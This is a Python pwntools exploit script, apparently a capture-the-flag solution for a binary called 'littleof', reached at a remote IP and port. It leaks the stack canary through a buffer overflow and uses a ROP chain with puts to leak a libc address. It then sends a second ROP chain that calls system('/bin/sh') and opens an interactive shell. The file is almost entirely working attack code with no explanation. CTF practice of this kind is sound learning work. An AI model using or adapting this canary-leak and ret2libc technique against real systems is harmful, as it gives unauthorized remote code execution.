from pwn import *

context.log_level='debug'

#p = process('./littleof')
p = remote('182.116.62.85',27056)
elf = ELF('./littleof')
libc = ELF('./libc-2.27.so')
main = 0x0000000000400600


#attach(p,'b *0x0000000000400787')
pause()
payload = 'a'*0x48
p.recvuntil('Do you know how to do buffer overflow?\n')
p.sendline(payload)
#pause()
p.recvuntil('a'*0x48)
canary = u64(p.recv(8))-0xa
print hex(canary)

pop_rdi = 0x00000000400863
ret = 0x000000000040059e

payload = 'a'*0x48+p64(canary) + 'junkjunk' + p64(pop_rdi) +p64(elf.got['puts'])+ p64(elf.plt['puts']) + p64(main)

p.sendline(payload)
p.recvuntil('I hope you win')
puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print "puts=>[+]"+hex(puts)
libc_base = puts-libc.sym['puts']
print "libc=>[+]"+hex(libc_base)



payload = 'a'*0x48
p.recvuntil('Do you know how to do buffer overflow?\n')
p.sendline(payload)
p.recvuntil('a'*0x48)
canary = u64(p.recv(8))-0xa
print hex(canary)
pause()

binsh = 0x00000000001b3e1a + libc_base
system = libc_base + 0x4f550#libc.sym['system']
print "sys=>[+]"+hex(system)
payload = 'a'*0x48+p64(canary) + 'junkjunk' + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(system)
pause()
p.sendline(payload)
# leak()
# payload = 
p.interactive()